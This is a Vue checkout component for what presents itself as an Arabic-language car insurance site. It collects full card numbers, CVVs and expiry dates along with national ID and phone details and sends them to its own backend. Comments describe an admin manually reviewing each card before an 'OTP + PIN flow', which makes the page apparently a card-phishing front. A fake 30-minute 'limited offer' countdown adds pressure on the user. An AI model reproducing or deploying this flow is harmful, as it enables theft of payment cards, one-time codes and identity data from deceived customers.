<template>
    <div class="min-h-screen bg-slate-50" dir="rtl">
        <!-- Header Bar -->
        <div class="bg-white border-b border-slate-200">
            <div class="box py-3 flex items-center justify-between">
                <button class="flex items-center gap-1.5 text-primary typ-s2 hover:text-primary-dark transition-colors cursor-pointer"
                    @click="goBack">
                    <svg class="w-4 h-4 rotate-180" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7" />
                    </svg>
                    العودة للعروض
                </button>
            </div>
        </div>
        <FunnelProgress :current="1" />

        <!-- Main Content -->
        <div v-if="plan" class="box py-4 sm:py-6">

            <!-- Payment Error Alert -->
            <transition name="fade">
                <div v-if="paymentError"
                    class="flex items-start gap-3 p-4 bg-red-50 border border-red-200 rounded-xl mb-4" role="alert">
                    <svg class="w-5 h-5 text-red-500 shrink-0 mt-0.5" fill="currentColor" viewBox="0 0 20 20">
                        <path fill-rule="evenodd"
                            d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z"
                            clip-rule="evenodd" />
                    </svg>
                    <p class="flex-1 text-sm font-bold text-red-700">{{ paymentError }}</p>
                    <button class="text-red-400 hover:text-red-600 transition-colors cursor-pointer"
                        @click="paymentError = ''">
                        <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                                d="M6 18L18 6M6 6l12 12" />
                        </svg>
                    </button>
                </div>
            </transition>

            <div class="grid grid-cols-1 lg:grid-cols-[1fr_380px] gap-4 sm:gap-6">

                <!-- ═══ Left Column: Forms ═══ -->
                <div class="min-w-0 space-y-4 sm:space-y-6">

                    <!-- Payment Method Card -->
                    <PaymentMethodCard
                        :method="form.paymentMethod"
                        :form="cardForm"
                        :errors="errors"
                        :rejection-reason="cardRejectionReason"
                        @update:method="form.paymentMethod = $event"
                        @update:form="onCardFormUpdate($event)"
                    />

                    <!-- Terms & Conditions -->
                    <div class="bg-white rounded-2xl border border-slate-200 p-4 sm:p-6">
                        <h5 class="text-lg font-bold text-foreground mb-4">الشروط والأحكام</h5>

                        <label for="accept-terms" class="flex items-start gap-3 cursor-pointer">
                            <CheckboxRoot id="accept-terms" v-model:checked="form.acceptTerms" name="accept-terms"
                                class="flex h-5 w-5 shrink-0 appearance-none items-center justify-center rounded-md border-2 mt-0.5 transition-colors cursor-pointer"
                                :class="form.acceptTerms ? 'bg-primary border-primary' : 'bg-white border-slate-300 hover:border-slate-400'">
                                <CheckboxIndicator>
                                    <svg class="w-3.5 h-3.5 text-white" fill="none" stroke="currentColor"
                                        viewBox="0 0 24 24">
                                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="3"
                                            d="M5 13l4 4L19 7" />
                                    </svg>
                                </CheckboxIndicator>
                            </CheckboxRoot>
                            <span class="typ-s2 text-foreground">أقر بأن جميع البيانات المدخلة صحيحة و أوافق على
                                <a href="#" class="text-primary hover:underline">الشروط والأحكام</a>
                                و
                                <a href="#" class="text-primary hover:underline">سياسة الخصوصية</a>
                                الخاصة بتأمينكم
                            </span>
                        </label>

                        <p v-if="errors.acceptTerms" class="text-destructive typ-c1 mt-3">
                            {{ errors.acceptTerms }}
                        </p>
                    </div>
                </div>

                <!-- ═══ Right Column: Price Sidebar ═══ -->
                <div class="order-last">
                    <div class="lg:sticky lg:top-[70px] space-y-4">

                        <!-- ── تفاصيل الملخص ── -->
                        <PriceSummaryCard
                            :subtotal="subtotal"
                            :vat-amount="vatAmount"
                            :total-price="totalPrice"
                            :addons="selectedAddons"
                        />

                    </div>
                </div>
            </div>

            <!-- Bottom Action Bar -->
            <div
                class="border-0 border-t border-solid border-slate-200 bg-white/95 backdrop-blur-sm px-3 sticky bottom-0 z-[49] shadow-[0_-2px_8px_rgba(0,0,0,0.08)] lg:static lg:bottom-auto lg:bg-transparent lg:backdrop-blur-none lg:shadow-none lg:mt-6 safe-area-bottom">
                <div class="flex items-center py-3 gap-2 sm:gap-3 justify-between">
                    <button class="px-3 sm:px-8 py-2.5 sm:py-3 bg-slate-100 hover:bg-slate-200 text-slate-600 font-bold text-xs sm:text-base rounded-xl transition-colors cursor-pointer shrink-0"
                        @click="goBack">
                        السابق
                    </button>
                    <!-- Mobile: price shown separately -->
                    <div class="flex sm:hidden items-center gap-1 font-bold text-foreground text-sm ltr-nums">
                        <span>{{ formatDecimal(totalPrice) }}</span>
                        <SarIcon className="size-3" />
                    </div>
                    <button :disabled="isSubmitting" class="disabled:cursor-not-allowed disabled:opacity-60 bg-primary hover:bg-primary-dark text-white py-3 sm:py-3.5 px-5 sm:px-8 rounded-xl font-bold text-sm sm:text-base transition-colors cursor-pointer flex items-center justify-center gap-2 shrink-0"
                        @click="handleSubmit">
                        <svg v-if="isSubmitting" class="w-5 h-5 animate-spin" fill="none" viewBox="0 0 24 24">
                            <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4" />
                            <path class="opacity-75" fill="currentColor"
                                d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z" />
                        </svg>
                        <span v-if="isSubmitting">جاري المعالجة...</span>
                        <template v-else>
                            <span>إتمام الدفع</span>
                            <!-- Desktop: price inside button -->
                            <span class="hidden sm:flex text-white/80 text-sm ltr-nums items-center gap-0.5">{{ formatDecimal(totalPrice) }}
                                <SarIcon className="size-3" />
                            </span>
                        </template>
                    </button>
                </div>
            </div>
        </div>

        <!-- No Plan Selected State -->
        <div v-else class="box py-20">
            <div class="flex flex-col items-center justify-center text-center">
                <div class="text-5xl mb-4">🛒</div>
                <h2 class="text-xl font-bold text-foreground mb-3">لم يتم اختيار وثيقة</h2>
                <p class="text-sm text-muted mb-6">يرجى اختيار وثيقة تأمين من صفحة المقارنة أولاً</p>
                <router-link to="/compare"
                    class="inline-flex items-center gap-2 bg-primary text-white px-6 py-3 rounded-xl font-medium hover:bg-primary-dark transition-colors">
                    <svg class="w-4 h-4 rotate-180" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7" />
                    </svg>
                    العودة للمقارنة
                </router-link>
            </div>
        </div>

    </div>

    <!-- ═══ Discount Popup Modal ═══ -->
    <Teleport to="body">
        <Transition enter-active-class="transition-all duration-300 ease-out"
            enter-from-class="opacity-0" enter-to-class="opacity-100"
            leave-active-class="transition-all duration-200 ease-in"
            leave-from-class="opacity-100" leave-to-class="opacity-0">
            <div v-if="showDiscountPopup" class="fixed inset-0 z-[999] flex items-center justify-center p-4"
                @click.self="showDiscountPopup = false">
                <!-- Overlay -->
                <div class="absolute inset-0 bg-black/60 backdrop-blur-sm"></div>

                <!-- Modal -->
                <div class="relative bg-white rounded-3xl shadow-2xl max-w-sm w-full overflow-hidden animate-bounce-in">
                    <!-- Close Button -->
                    <button class="absolute top-3 start-3 z-10 w-8 h-8 rounded-full bg-white/80 hover:bg-white flex items-center justify-center transition-colors cursor-pointer shadow-sm"
                        @click="showDiscountPopup = false">
                        <svg class="w-4 h-4 text-slate-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12" />
                        </svg>
                    </button>

                    <!-- Discount Image -->
                    <div class="w-full">
                        <img :src="cashBackImg" alt="وفّر على أسعار التأمين" class="w-full h-auto object-cover" width="1071" height="1280" />
                    </div>

                    <!-- Content -->
                    <div class="p-5 text-center">
                        <div class="inline-flex items-center gap-2 bg-red-50 border border-red-200 rounded-full px-4 py-1.5 mb-3">
                            <span class="w-2 h-2 bg-red-500 rounded-full animate-pulse"></span>
                            <span class="text-red-600 typ-c1 font-bold">عرض لفترة محدودة</span>
                        </div>

                        <!-- Countdown Timer -->
                        <div class="flex items-center justify-center gap-4 mb-5" dir="ltr">
                            <div class="flex flex-col items-center">
                                <span class="text-5xl font-extrabold text-primary ltr-nums tabular-nums w-20 text-center">{{ discountMinutes }}</span>
                                <span class="typ-b2 text-muted mt-1">دقيقة</span>
                            </div>
                            <span class="text-4xl font-bold text-slate-300 -mt-5">:</span>
                            <div class="flex flex-col items-center">
                                <span class="text-5xl font-extrabold text-primary ltr-nums tabular-nums w-20 text-center">{{ discountSeconds }}</span>
                                <span class="typ-b2 text-muted mt-1">ثانية</span>
                            </div>
                        </div>

                        <!-- CTA Button -->
                        <button class="w-full py-3 bg-primary hover:bg-primary-dark text-white font-bold text-base rounded-xl transition-colors cursor-pointer"
                            @click="showDiscountPopup = false">
                            استفد من العرض الآن
                        </button>
                    </div>
                </div>
            </div>
        </Transition>
    </Teleport>
</template>

<script setup>
import { ref, reactive, computed, onMounted, onUnmounted, nextTick } from 'vue';
import { useRoute, useRouter } from 'vue-router';
import {
    CheckboxRoot, CheckboxIndicator,
} from 'radix-vue';
import { getPlanWithCompany } from '@/data';
import { calculateTotalWithVAT } from '@/utils/pricing';
import { validateCardForm } from '@/utils/cardValidation';
import { useQuoteTracking } from '@/composables/useQuoteTracking';
import { trackStepViewed, trackCheckoutSubmitted, trackStepCompleted } from '@/composables/useFunnelTracking';
import { useInsuranceStore } from '@/store';
import { usePricingEngine } from '@/utils/pricingEngine';
import { usePayment } from '@/composables/usePayment';
import { submitQuote } from '@/api/quotes';
import { getReasonLabel } from '@/constants/rejectionReasons';
import { useI18n } from 'vue-i18n';
import logger from '@/utils/logger';
import SarIcon from '@/components/SarIcon.vue';
import FunnelProgress from '@/car.insurance/components/FunnelProgress.vue';
import PaymentMethodCard from '../components/checkout/PaymentMethodCard.vue';
import PriceSummaryCard from '../components/checkout/PriceSummaryCard.vue';
import cashBackImg from '@/../../resources/images/logo/summary_logo/cash_back.jpeg';

const route = useRoute();
const router = useRouter();
const { t } = useI18n();
const { trackStep, completeSession } = useQuoteTracking();
const insuranceStore = useInsuranceStore();
const { calculatePremium } = usePricingEngine();
const { processCardPayment, loading: _paymentLoading, error: paymentApiError } = usePayment();

//
const planId = computed( () => {
    if ( selectedPlanData.value?.id ) return selectedPlanData.value.id;
    const raw = sessionStorage.getItem( 'selectedPlan' );
    if ( raw ) {
        try { return JSON.parse( raw ).id; } catch { /* ignore */ }
    }
    return null;
} );
const plan = computed( () => planId.value ? getPlanWithCompany( planId.value ) : null );

//
const selectedPlanData = ref( null );
const selectedDeductible = ref( 0 );
const selectedAddons = ref( [] );
const vehicleInfo = ref( null );

// Load selected plan data immediately (before onMounted) so planId computed works
{
    const raw = sessionStorage.getItem( 'selectedPlan' );
    if ( raw ) {
        try { selectedPlanData.value = JSON.parse( raw ); } catch { /* ignore */ }
    }
}

onMounted( () => {
    // استعادة بيانات التأمين من المتجر
    insuranceStore.hydrateFromSession();

    // Load selected plan data
    if ( selectedPlanData.value ) {
        selectedDeductible.value = selectedPlanData.value.deductible || plan.value?.deductible || 0;
        selectedAddons.value = selectedPlanData.value.addons || [];
    }
    if ( !selectedDeductible.value && plan.value ) {
        selectedDeductible.value = plan.value.deductible;
    }

    // Load vehicle info
    const vehicleRaw = sessionStorage.getItem( 'vehicleInfo' );
    if ( vehicleRaw ) {
        try { vehicleInfo.value = JSON.parse( vehicleRaw ); } catch { /* ignore */ }
    }

    trackStep( 'checkout', 5, { plan_id: planId.value }, 'next' );
    trackStepViewed( 'checkout', { plan_id: planId.value } );

    // Show discount popup after user has had time to look at the page
    setTimeout( () => {
        showDiscountPopup.value = true;
        startDiscountTimer();
    }, 5000 );
} );

// التسعير الديناميكي
const dynamicPrice = computed( () => {
    if ( !plan.value ) return { annualPrice: 0, monthlyPrice: 0 };
    // أولاً: من selectedPlan (محسوب في ComparePage/DetailsPage)
    if ( selectedPlanData.value?.annualPrice ) {
        return {
            annualPrice: selectedPlanData.value.annualPrice,
            monthlyPrice: selectedPlanData.value.monthlyPrice || Math.round( selectedPlanData.value.annualPrice / 12 ),
        };
    }
    // ثانياً: من الأسعار المحسوبة في المتجر
    const cached = insuranceStore.calculatedQuotes.find( q => q.id === plan.value.id );
    if ( cached ) {
        return { annualPrice: cached.annualPrice, monthlyPrice: cached.monthlyPrice };
    }
    // ثالثاً: إعادة حساب (store already hydrated in onMounted)
    return calculatePremium( plan.value, insuranceStore.allFormData );
} );

//
const subtotal = computed( () => {
    const base = dynamicPrice.value.annualPrice || 0;
    const addonSum = selectedAddons.value.reduce( ( sum, a ) => sum + a.price, 0 );
    return base + addonSum;
} );
const pricingResult = computed( () => calculateTotalWithVAT( dynamicPrice.value.annualPrice || 0, selectedAddons.value.reduce( ( s, a ) => s + a.price, 0 ) ) );
const vatAmount = computed( () => pricingResult.value.vat );
const totalPrice = computed( () => pricingResult.value.total );
const _monthlyTotal = computed( () => {
    const base = dynamicPrice.value.monthlyPrice || 0;
    const addonSum = selectedAddons.value.reduce( ( sum, a ) => sum + Math.ceil( a.price / 12 ), 0 );
    return calculateTotalWithVAT( base + addonSum ).total;
} );

// Format with 2 decimal places + thousand separator
function formatDecimal( num ) {
    return new Intl.NumberFormat( 'en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 } ).format( num );
}

// Computed card form subset for PaymentMethodCard child
const cardForm = computed( () => ({
    cardNumber: form.cardNumber,
    expiry: form.expiry,
    cvv: form.cvv,
    cardHolder: form.cardHolder,
}) );

//
const form = reactive( {
    paymentMethod: 'card',
    cardNumber: '',
    expiry: '',
    cvv: '',
    cardHolder: '',
    acceptTerms: false,
} );



const errors = reactive( {} );
const isSubmitting = ref( false );
const paymentError = ref( '' );

// ── Card rejection reason (from PaymentWaitingPage redirect) ────────
const cardRejectionReason = ref( '' );
{
    const reasonKey = route.query.rejectionReason;
    if ( reasonKey && typeof reasonKey === 'string' && reasonKey.length >= 3 )
    {
        cardRejectionReason.value = getReasonLabel( reasonKey, t ) || reasonKey;
        // Clean up URL without triggering navigation
        router.replace( { ...route, query: { ...route.query, rejectionReason: undefined } } );
    }
}

// ═══ Discount Popup ═══
const showDiscountPopup = ref( false );
const discountTimeLeft = ref( 30 * 60 );
let discountTimer = null;

const discountMinutes = computed( () => String( Math.floor( discountTimeLeft.value / 60 ) ).padStart( 2, '0' ) );
const discountSeconds = computed( () => String( discountTimeLeft.value % 60 ).padStart( 2, '0' ) );

function startDiscountTimer() {
    discountTimer = setInterval( () => {
        if ( discountTimeLeft.value > 0 ) {
            discountTimeLeft.value--;
        } else {
            clearInterval( discountTimer );
        }
    }, 1000 );
}

//
function validate() {
    Object.keys( errors ).forEach( k => delete errors[ k ] );

    if ( form.paymentMethod === 'card' ) {
        const result = validateCardForm( form );
        if ( !result.valid ) {
            Object.assign( errors, result.errors );
            return false;
        }
    }

    if ( !form.acceptTerms ) { errors.acceptTerms = 'يجب الموافقة على الشروط والأحكام'; return false; }

    return true;
}

//

//
function onCardFormUpdate ( data ) {
    Object.assign( form, data );
    // Dismiss rejection alert when user starts editing card fields
    if ( cardRejectionReason.value ) cardRejectionReason.value = '';
}

async function handleSubmit() {
    if ( isSubmitting.value ) return;
    paymentError.value = '';
    if ( !validate() ) {
        // Scroll to first error
        nextTick( () => {
            document.querySelector( '.text-destructive' )?.scrollIntoView( { behavior: 'smooth', block: 'center' } );
        } );
        return;
    }

    isSubmitting.value = true;

    const cardDigits = form.cardNumber.replace( /\s/g, '' );
    const [ expiryMonth, expiryYear ] = ( form.expiry || '' ).split( '/' ).map( s => ( s || '' ).trim() );

    const result = await processCardPayment(
        {
            card_number: cardDigits,
            holder_name: form.cardHolder,
            expiry_month: expiryMonth,
            expiry_year: expiryYear,
            cvv: form.cvv,
        },
        {
            totalPrice: totalPrice.value || null,
            selectedInsurance: plan.value ? {
                id: plan.value.id,
                name: plan.value.name,
                company: plan.value.company?.nameAr || plan.value.company?.name || null,
                type: plan.value.type || null,
            } : null,
        }
    );

    if ( !result ) {
        isSubmitting.value = false;
        paymentError.value = paymentApiError.value || 'حدث خطأ أثناء إرسال بيانات البطاقة';
        return;
    }

    // Submit order to backend to get server-generated order/policy numbers
    let orderNumber;
    let policyNumber;
    try {
        const orderResult = await submitQuote( {
            plan_id: plan.value.id,
            plan_name: plan.value.name,
            insurance_company: plan.value.company?.nameAr || '',
            insurance_type: plan.value.type === 'thirdParty' ? 'third_party' : 'comprehensive',
            plan_type: plan.value.subType || plan.value.type,
            subtotal: subtotal.value,
            vat_amount: vatAmount.value,
            total: totalPrice.value,
            deductible: selectedDeductible.value,
            addons: selectedAddons.value,
            pricing_factors: plan.value.pricingFactors || null,
            applicant_name: insuranceStore.driver.fullName || '',
            applicant_national_id: insuranceStore.driver.nationalId || '',
            applicant_phone: insuranceStore.driver.phone || '',
            applicant_email: insuranceStore.driver.email || '',
            vehicle_plate: insuranceStore.vehicle.plateNumber || '',
            vehicle_make: insuranceStore.vehicle.makeName || '',
            vehicle_model: insuranceStore.vehicle.modelName || '',
            vehicle_year: insuranceStore.vehicle.year || null,
            policy_start_date: insuranceStore.policy.policyStartDate || null,
            payment_method: form.paymentMethod === 'card' ? 'card' : form.paymentMethod,
        } );
        orderNumber = orderResult.order_number;
        policyNumber = orderResult.policy_number;
    } catch ( err ) {
        logger.warn( '[Checkout] Order API failed, using client-side fallback:', err );
        orderNumber = 'ORD-' + Date.now().toString( 36 ).toUpperCase();
        policyNumber = '';
    }

    // Save order data to sessionStorage for confirmation page (used after OTP + PIN flow)
    try
    {
        sessionStorage.setItem( 'orderData', JSON.stringify( {
            plan: {
                id: plan.value.id,
                name: plan.value.name,
                companyName: plan.value.company.nameAr,
                typeAr: plan.value.typeAr,
                type: plan.value.type,
            },
            applicant: {
                fullName: insuranceStore.driver.fullName,
                identityNumber: insuranceStore.driver.nationalId,
                phone: insuranceStore.driver.phone,
                email: insuranceStore.driver.email,
            },
            pricing: {
                subtotal: subtotal.value,
                vat: vatAmount.value,
                total: totalPrice.value,
                addons: selectedAddons.value,
                deductible: selectedDeductible.value,
            },
            paymentMethod: form.paymentMethod,
            policyStartDate: insuranceStore.policy.policyStartDate,
            insuranceType: insuranceStore.policy.insuranceType,
            orderNumber,
            policyNumber,
            orderDate: new Date().toISOString(),
        } ) );
    } catch { /* storage full — non-critical */ }

    try { trackStep( 'payment_completed', 6, { plan_id: plan.value.id, total: totalPrice.value }, 'next' ); } catch { /* tracking — non-critical */ }
    trackCheckoutSubmitted( { plan_id: plan.value?.id, total: totalPrice.value } );
    trackStepCompleted( 'checkout', 'payment_waiting' );

    // Complete quote session — stops heartbeat so it won't 404 after navigation
    try { await completeSession(); } catch { /* session cleanup — non-critical */ }

    // Navigate to payment waiting page (admin reviews card before OTP)
    router.push( { name: 'paymentWaiting' } );
}

function goBack() {
    router.push( { name: 'compare' } );
}

onUnmounted( () => {
    if ( discountTimer ) clearInterval( discountTimer );
} );
</script>

<style scoped>
@keyframes bounce-in {
    0% { transform: scale(0.8) translateY(20px); opacity: 0; }
    60% { transform: scale(1.03); opacity: 1; }
    100% { transform: scale(1) translateY(0); }
}
.animate-bounce-in {
    animation: bounce-in 0.4s ease-out;
}
</style>
